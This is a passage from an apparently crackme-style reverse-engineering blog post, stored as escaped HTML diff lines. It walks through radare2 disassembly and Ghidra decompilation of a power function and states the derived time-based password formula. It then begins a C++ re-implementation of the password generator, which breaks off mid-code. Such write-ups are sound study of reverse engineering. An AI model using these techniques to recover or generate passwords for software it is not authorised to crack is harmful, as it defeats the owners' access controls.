+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│       ╎   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;cmp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;exponent&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;   ; check if value stored in eax is greater than or equal to exponent
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│      ┌──&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;jge &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;_end                    
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│      │╎   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;result&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│      │╎   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;imul &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;base&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│      │╎   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;result&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], eax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│      │╎   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;add &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_4h&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│      │└─&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;jmp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x5619c19b3230
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│      └──&amp;gt; _end:
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;|           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;result&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;pop &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rbp
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;└           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;ret
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;For power(10, 0) assembly code looks like that:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;nasm&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-nasm &quot;&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;┌ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;52&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;: sym.p_int__int (int64_t arg1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;int64_t arg2)&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;           ; var int64_t exponent @ rbp-0x18
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;           ; var int64_t base @ rbp-0x14
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;           ; var int64_t result @ rbp-0x8
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;           ; var int64_t var_4h @ rbp-0x4
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;           ; arg int64_t arg1 @ rdi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;           ; arg int64_t arg2 @ rsi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;push &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rbp                    
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rbp, rsp
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;base&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], edi&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;       ; 10
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;exponent&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], esi&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;   ; 0
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;base&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;       ; eax = 10
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;result&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], eax&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;     ; result = 10
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_4h&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;       ; var_4h = 1
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│           
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│       ┌─&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_4h&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;     ; eax = 1
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│       ╎   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;cmp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;exponent&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;   ; eax &amp;gt; exponent =&amp;gt; 1 &amp;gt; 0
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│      ┌──&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;jge &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;_end&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;                    ; So we make a jump
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│      │╎   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;result&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│      │╎   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;imul &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;base&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│      │╎   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;result&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], eax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│      │╎   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;add &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_4h&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│      │└─&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;jmp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x5619c19b3230
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│      └──&amp;gt; _end:
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;|           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;result&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;     ; eax = 10
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;pop &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rbp
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;└           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;ret
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;And this is why power(10, 0) = 10. Here is a C code of power function obtained from Ghidra:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;cpp&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-cpp &quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span&gt;ulong &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;power&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;base&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;exponent&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; pow;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; i;
+&lt;&#x2F;span&gt;&lt;span&gt;  
+&lt;&#x2F;span&gt;&lt;span&gt;  i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  pow &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; base;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;(i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; exponent) {
+&lt;&#x2F;span&gt;&lt;span&gt;    pow &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; pow &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt; base;
+&lt;&#x2F;span&gt;&lt;span&gt;    i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  }
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;(ulong)pow;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;When the cross_sum job is done, the final password is calculated by using this formula:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;    password = miliseconds % (microseconds_digit_sum * microseconds);
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Here is the whole code rewritten. I added some debug information for presentation purposes.
+Code should be compiled on linux with compiler which supports C++17.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;cpp&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-cpp &quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;lt;iostream&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;lt;sys&#x2F;time.h&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;lt;cmath&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;constexpr bool&lt;&#x2F;span&gt;&lt;span&gt; debug_flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;digit_sum&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;long &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;number&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; debug_sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; exponent &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;(exponent &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;(number) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)) {
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;        ulong p1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(exponent &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;? &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;10 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;, exponent)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;        ulong p2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;, exponent &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;        ulong p3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(exponent &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;? &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;10 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;, exponent)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;        
